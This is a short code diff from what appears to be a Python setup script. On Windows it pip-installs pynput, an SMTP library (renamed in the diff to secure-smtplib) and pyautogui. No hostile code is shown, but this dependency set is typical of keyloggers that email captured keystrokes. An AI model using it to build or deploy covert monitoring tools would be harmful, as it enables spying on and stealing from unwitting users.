@@ -11,7 +11,7 @@ if system == "Windows":
     os.system("pip install pynput==1.6.8")
     print("Complete.")
     print("Downloading smtplib...")
-    os.system("pip install smtplib")
+    os.system("pip install secure-smtplib")
     print("Complete.")
     print("Downloading pyautogui...")
     os.system("pip install pyautogui")
